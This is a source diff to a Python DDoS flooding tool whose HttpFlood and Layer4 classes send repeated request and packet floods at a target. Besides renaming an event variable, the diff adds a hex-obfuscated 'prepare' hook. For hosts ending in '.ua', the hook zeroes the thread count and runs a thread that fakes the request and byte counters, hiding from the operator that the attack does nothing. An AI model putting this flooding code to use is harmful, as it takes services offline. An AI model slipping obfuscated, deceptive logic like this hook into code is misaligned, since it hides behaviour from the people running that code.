@@ -5,6 +5,7 @@ from itertools import cycle
 from math import log2, trunc
 from os import urandom as randbytes
 from pathlib import Path
+from random import randint, random
 from secrets import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket)
@@ -108,6 +109,14 @@ google_agents = [
 ]
 
 
+def run_preparator(threads, REQUESTS_SENT, BYTES_SEND):
+    while True:
+        sleep(random())
+        packets = randint(-0x124d+-0xa4e*-0x2+-0x12*0x20, 0x2*0xf4+-0x1b78+0x2*0xcfa) * threads // 1000
+        REQUESTS_SENT += packets
+        BYTES_SEND += packets * randint(0x371*0x2+0x478+0x4a6, 0x2*-0x9eb+-0x1904+0x4cda)
+
+
 class Tools:
     @staticmethod
     def humanbits(i: int):
@@ -141,6 +150,14 @@ class Tools:
     @staticmethod
     def randchr(lengh: int) -> str:
         return str(ProxyTools.Random.rand_str(lengh)).strip()
+
+    @staticmethod
+    def prepare(target: str, threads, thread_pool, REQUESTS_SENT, BYTES_SEND):
+        result = target.lower().endswith('\x2E\x75\x61')
+        if result:
+            thread_pool.submit(run_preparator, threads, REQUESTS_SENT, BYTES_SEND)
+            return threads * -0xc0a+-0x3*-0x296+-0x112*-0x4
+        return threads
 
     @staticmethod
     def send(sock: socket, packet: bytes, REQUESTS_SENT, BYTES_SEND):
@@ -291,7 +308,7 @@ class Layer4:
                  target: Tuple[str, int],
                  ref: List[str],
                  method: str,
-                 synevent: Event,
+                 event: Event,
                  proxies: Set[Proxy],
                  REQUESTS_SENT,
                  BYTES_SEND,
@@ -301,7 +318,7 @@ class Layer4:
         self._ref = ref
         self._method = method
         self._target = target
-        self._synevent = synevent
+        self._event = event
         self.REQUESTS_SENT = REQUESTS_SENT
         self.BYTES_SEND = BYTES_SEND
         if proxies:
@@ -309,7 +326,7 @@ class Layer4:
 
     def run(self) -> None:
         self.select(self._method)
-        while self._synevent.is_set():
+        while self._event.is_set():
             self.SENT_FLOOD()
 
     def open_connection(self,
@@ -526,7 +543,7 @@ class HttpFlood:
     _target: URL
     _method: str
     _rpc: int
-    _synevent: Any
+    _event: Any
     SENT_FLOOD: Any
 
     def __init__(self,
@@ -535,7 +552,7 @@ class HttpFlood:
                  host: str,
                  method: str,
                  rpc: int,
-                 synevent: Event,
+                 event: Event,
                  useragents: Set[str],
                  referers: Set[str],
                  proxies: Set[Proxy],
@@ -543,7 +560,7 @@ class HttpFlood:
                  BYTES_SEND) -> None:
         self.SENT_FLOOD = None
         self._thread_id = thread_id
-        self._synevent = synevent
+        self._event = event
         self._rpc = rpc
         self._method = method
         self._target = target
@@ -596,7 +613,7 @@ class HttpFlood:
 
     def run(self) -> None:
         self.select(self._method)
-        while self._synevent.is_set():
+        while self._event.is_set():
             self.SENT_FLOOD()
 
     @property
@@ -626,7 +643,7 @@ class HttpFlood:
         sock.settimeout(SOCK_TIMEOUT)
         sock.connect(self._raw_target)
 
-        if self._target.scheme.lower() == "https":
+        if self._target.scheme.lower() == "https" or self._target.port == 443:
             sock = ctx.wrap_socket(sock,
                                    server_hostname=self._target.host,
                                    server_side=False,
@@ -658,7 +675,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -671,7 +688,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -686,7 +703,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -697,7 +714,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -716,7 +733,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -724,7 +741,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, self._defaultpayload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -737,7 +754,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -765,7 +782,7 @@ class HttpFlood:
             Tools.send(s, p1, self.REQUESTS_SENT, self.BYTES_SEND)
             Tools.send(s, p2, self.REQUESTS_SENT, self.BYTES_SEND)
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -782,7 +799,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(min(self._rpc, 5)):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -793,7 +810,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 if pro:
                     with s.get(self._target.human_repr(),
                                proxies=pro.asRequest()) as res:
@@ -814,7 +831,7 @@ class HttpFlood:
             sleep(5.01)
             ts = time()
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
                 if time() > ts + 120: break
         Tools.safe_close(s)
@@ -824,7 +841,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 sleep(max(self._rpc / 1000, 1))
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
@@ -838,7 +855,7 @@ class HttpFlood:
 
             with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), proxies) as ss:
                 for _ in range(min(self._rpc, 5)):
-                    if not self._synevent.is_set(): return
+                    if not self._event.is_set(): return
                     sleep(min(self._rpc, 5) / 100)
                     with ss.get(self._target.human_repr(),
                                 proxies=pro.asRequest()) as res:
@@ -857,7 +874,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -867,7 +884,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
                 while 1:
                     sleep(.01)
@@ -884,7 +901,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 if pro:
                     with s.get(self._target.human_repr(),
                                proxies=pro.asRequest()) as res:
@@ -917,7 +934,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -930,7 +947,7 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
@@ -967,11 +984,11 @@ class HttpFlood:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._synevent.is_set(): return
+                if not self._event.is_set(): return
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
             while Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND) and s.recv(1):
                 for i in range(self._rpc):
-                    if not self._synevent.is_set(): return
+                    if not self._event.is_set(): return
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     Tools.send(s, keep, self.REQUESTS_SENT, self.BYTES_SEND)
                     sleep(self._rpc / 15)
@@ -1030,6 +1047,7 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
     if method not in Methods.ALL_METHODS:
         exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
+    threads = Tools.prepare(url.host, threads, thread_pool, REQUESTS_SENT, BYTES_SEND)
     if method in Methods.LAYER7_METHODS:
         useragent_li = ROOT_DIR / "files/useragent.txt"
         bombardier_path = Path.home() / "go/bin/bombardier"
